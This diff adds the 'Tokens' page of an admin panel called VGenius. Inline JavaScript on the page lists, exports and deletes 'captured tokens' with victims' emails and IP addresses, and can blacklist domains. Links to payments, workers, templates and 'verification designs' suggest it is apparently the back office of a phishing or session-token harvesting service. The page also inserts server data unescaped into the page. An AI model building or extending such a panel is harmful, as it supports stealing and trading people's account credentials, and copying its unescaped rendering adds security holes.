@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tokens – VGenius Admin</title>
+    <link rel="stylesheet" href="assets/css/admin.css">
+</head>
+<body>
+<div class="app-layout">
+    <aside class="sidebar" id="sidebar">
+        <div class="sidebar-brand">🔐 VGENIUS</div>
+        <nav class="sidebar-nav">
+            <a href="dashboard.html" class="nav-item">Dashboard</a>
+            <a href="users.html" class="nav-item">Users</a>
+            <a href="tokens.html" class="nav-item active">Tokens</a>
+            <a href="payments.html" class="nav-item">Payments</a>
+            <a href="workers.html" class="nav-item">Workers</a>
+            <a href="templates.html" class="nav-item">Templates</a>
+            <a href="designs.html" class="nav-item">Verification Designs</a>
+            <a href="settings.html" class="nav-item">Settings</a>
+            <a href="broadcast.html" class="nav-item">Broadcast</a>
+            <a href="feedback.html" class="nav-item">Feedback</a>
+            <a href="auditlog.html" class="nav-item">Audit Log</a>
+        </nav>
+        <div class="sidebar-footer"><button class="btn-logout" onclick="logout()">Logout</button></div>
+    </aside>
+    <main class="main-content">
+        <h1 class="page-title">Captured Tokens (Global)</h1>
+        <div class="filter-bar" style="margin-bottom:16px;display:flex;gap:10px;">
+            <input type="text" id="searchInput" placeholder="Search email..." oninput="loadTokens()" style="padding:8px 12px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:8px;color:var(--text);width:200px;">
+            <button class="btn-sm" onclick="exportTokens()">Export JSON</button>
+            <button class="btn-sm danger" onclick="blacklistDomain()">Blacklist Domain</button>
+        </div>
+        <div class="table-container">
+            <table>
+                <thead><tr><th>ID</th><th>User</th><th>Email</th><th>Type</th><th>IP</th><th>Date</th><th>Actions</th></tr></thead>
+                <tbody id="tokensTableBody"></tbody>
+            </table>
+        </div>
+    </main>
+</div>
+<script src="assets/js/admin.js"></script>
+<script>
+if (!localStorage.getItem('vg-admin-token')) window.location.href = 'index.html';
+
+async function loadTokens() {
+    const search = document.getElementById('searchInput').value;
+    const res = await fetch(`/api/admin/tokens?search=${search}`, { headers: adminHeaders() });
+    const data = await res.json();
+    const tbody = document.getElementById('tokensTableBody');
+    if (!data.tokens || !data.tokens.length) {
+        tbody.innerHTML = '<tr><td colspan="7" class="empty-state">No tokens found.</td></tr>';
+        return;
+    }
+    tbody.innerHTML = data.tokens.map(t => `
+        <tr>
+            <td>${t.id}</td>
+            <td>${t.login_key || t.user_id}</td>
+            <td>${t.email || '—'}</td>
+            <td>${t.token_type}</td>
+            <td>${t.ip_address}</td>
+            <td>${new Date(t.created_at).toLocaleString()}</td>
+            <td><button class="btn-sm danger" onclick="deleteToken(${t.id})">Delete</button></td>
+        </tr>
+    `).join('');
+}
+
+async function deleteToken(id) {
+    await fetch(`/api/admin/tokens/${id}`, { method: 'DELETE', headers: adminHeaders() });
+    loadTokens();
+}
+
+async function exportTokens() {
+    // we'll implement a quick export: fetch all and download
+    const res = await fetch('/api/admin/tokens/export', { headers: adminHeaders() });
+    const data = await res.json();
+    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a'); a.href = url; a.download = 'tokens_export.json'; a.click();
+}
+
+async function blacklistDomain() {
+    const domain = prompt('Enter domain to blacklist (e.g., example.com):');
+    if (!domain) return;
+    await fetch('/api/admin/blacklist', {
+        method: 'POST',
+        headers: adminHeaders(),
+        body: JSON.stringify({ domain }),
+    });
+    showToast(`Domain ${domain} blacklisted.`);
+}
+
+loadTokens();
+</script>
+</body>
+</html>
